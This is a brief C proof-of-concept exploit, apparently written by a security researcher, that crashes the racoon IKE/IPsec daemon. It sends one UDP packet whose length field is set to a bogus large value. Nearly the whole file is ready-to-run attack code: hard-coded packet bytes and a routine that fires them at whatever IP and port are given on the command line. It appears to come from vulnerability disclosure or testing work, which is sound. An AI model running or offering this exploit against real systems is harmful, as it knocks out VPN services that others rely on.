/* by jwlampe@tenablesecurity.com ... real quick and dirty to show vuln in racoon wherein specifying a large
 * bogus LEN field causes crash */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

#define TIMEOUT 3

const char req[] =
"\x8F\x38\x5C\x2A\xEC\xB0\x3B\xFB\x32\xAF\x3C\x54\xEC\x18\xDB\x5C"
"\x02\x1A\xFE\x43\xFB\xFA\xAA\x3A"
"\xFB\xFF\xFF\xFF"                    //heres the LEN
"\x05\x3C\x7C\x94"
"\x75\xD8\xBE\x61\x89\xF9\x5C\xBB\xA8\x99\x0F\x95\xB1\xEB\xF1\xB3"
"\x05\xEF\xF7\x00\xE9\xA1\x3A\xE5\xCA\x0B\xCB\xD0\x48\x47\x64\xBD"
"\x1F\x23\x1E\xA8\x1C\x7B\x64\xC5\x14\x73\x5A\xC5\x5E\x4B\x79\x63";





int main(int argc, char *argv[]) {
	struct sockaddr_in addr;
	int s, port = 0 ;
	char *host = NULL;


        if (argc < 3) {
                fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}

	memset(&addr, 0, sizeof(addr));


	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host);
        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stdout, "Unable to connect: %s\n", strerror(errno));
	}

	write(s, req, sizeof(req) - 1);
	close(s);
	exit(1);
}

